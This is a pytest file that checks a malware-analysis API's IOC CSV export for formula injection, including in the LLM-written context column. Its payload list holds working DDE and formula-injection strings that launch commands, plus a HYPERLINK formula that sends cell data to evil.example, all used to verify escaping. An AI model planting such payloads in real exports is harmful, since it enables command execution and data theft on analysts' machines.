# Copyright 2026 Christopher Shaiman
# SPDX-License-Identifier: Apache-2.0
"""The IOC CSV export is opened in a spreadsheet, and its cells are attacker-chosen.

`/api/analyses/{id}/iocs/csv` is documented as "ready for SIEM and block lists",
which is another way of saying an analyst opens it. Every value in it comes from
the sample — mutex names, dropped filenames, registry keys — and the `context`
column is written by the LLM from that same material. A mutex named
`=cmd|'/c calc'!A1` is a working DDE payload the moment the file is opened in
Excel.

Assertions parse the emitted CSV with `csv.reader` and check the cell that comes
back out, rather than grepping the writer call — the value a spreadsheet acts on
is the value after quoting and unquoting, so that is the one worth pinning.
"""
import csv
import io
from dataclasses import dataclass

import pytest
from app.routers.analyses import IOC_CSV_HEADER, csv_safe, ioc_csv_rows


@dataclass
class _Ioc:
    type: str
    value: str


@dataclass
class _AnalysisIoc:
    confidence: object = ""
    source_stage: str = ""
    context: str = ""


def _roundtrip(ioc_type: str, value: str, **kw) -> list[str]:
    """Render one IOC through the real export and read the cells back."""
    buf = io.StringIO()
    writer = csv.writer(buf)
    writer.writerow(IOC_CSV_HEADER)
    writer.writerows(ioc_csv_rows([(_AnalysisIoc(**kw), _Ioc(ioc_type, value))]))
    buf.seek(0)
    rows = list(csv.reader(buf))
    assert rows[0] == IOC_CSV_HEADER
    return rows[1]


# --- the payloads --------------------------------------------------------

#: Real formula-injection payloads. The DDE one is the classic; the others are
#: the leads a spreadsheet also evaluates, which is why escaping only `=` fails.
PAYLOADS = [
    "=cmd|'/c calc'!A1",
    "@SUM(1+9)*cmd|'/c calc'!A1",
    "+cmd|'/c calc'!A1",
    "-2+3+cmd|'/c calc'!A1",
    "=HYPERLINK(\"http://evil.example?d=\"&A1,\"click\")",
    "\t=cmd|'/c calc'!A1",
    "\r=cmd|'/c calc'!A1",
]


@pytest.mark.parametrize("payload", PAYLOADS)
def test_a_formula_as_a_mutex_name_does_not_survive_as_a_formula(payload):
    cells = _roundtrip("mutex", payload)
    assert not cells[1].startswith(("=", "+", "-", "@", "\t", "\r")), (
        f"cell still begins with a formula lead: {cells[1]!r}")
    assert cells[1] == "'" + payload, "the payload must be preserved, only defanged"


@pytest.mark.parametrize("payload", PAYLOADS)
def test_the_llm_written_context_column_is_escaped_too(payload):
    """`context` is model output derived from the sample, not a trusted field."""
    cells = _roundtrip("mutex", "Global\\benign", context=payload)
    assert cells[4] == "'" + payload


def test_quoting_alone_would_not_have_saved_it():
    """A cell containing a comma is quoted by `csv` and Excel still evaluates it,
    so the escape has to change the first character, not rely on the quoting."""
    payload = '=cmd|\'/c calc\'!A1,extra'
    raw = io.StringIO()
    csv.writer(raw).writerows(ioc_csv_rows([(_AnalysisIoc(), _Ioc("mutex", payload))]))
    assert '"' in raw.getvalue(), "precondition: this value is quoted by csv"
    cell = list(csv.reader(io.StringIO(raw.getvalue())))[0][1]
    assert cell.startswith("'")


# --- what must NOT change ------------------------------------------------

@pytest.mark.parametrize("value", [
    "Global\\MyMutex",
    "185.220.101.5",
    "evil.example",
    "C:\\Users\\v\\AppData\\Local\\Temp\\a.exe",
    "d41d8cd98f00b204e9800998ecf8427e",
    "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
])
def test_ordinary_ioc_values_pass_through_untouched(value):
    """The export feeds block lists. An escape that mangled ordinary values
    would break the thing the endpoint exists for."""
    assert _roundtrip("generic", value)[1] == value


def test_an_empty_value_stays_empty():
    assert csv_safe("") == ""
    assert csv_safe(None) == ""


def test_a_numeric_confidence_is_unchanged():
    assert _roundtrip("mutex", "x", confidence=0.95)[2] == "0.95"


def test_a_negative_number_is_escaped_and_that_is_deliberate():
    """`-0.5` leads with `-`, so it is escaped. Losing the numeric type in a
    spreadsheet is the accepted cost of not evaluating `-2+3+cmd|...`; the two
    are indistinguishable from the first character alone."""
    assert _roundtrip("mutex", "x", confidence=-0.5)[2] == "'-0.5"


def test_every_column_goes_through_the_escape():
    """A column added later without the escape is the way this regresses."""
    hostile = "=cmd|'/c calc'!A1"
    cells = _roundtrip(hostile, hostile, confidence=hostile,
                       source_stage=hostile, context=hostile)
    assert len(cells) == len(IOC_CSV_HEADER)
    assert all(c == "'" + hostile for c in cells), cells
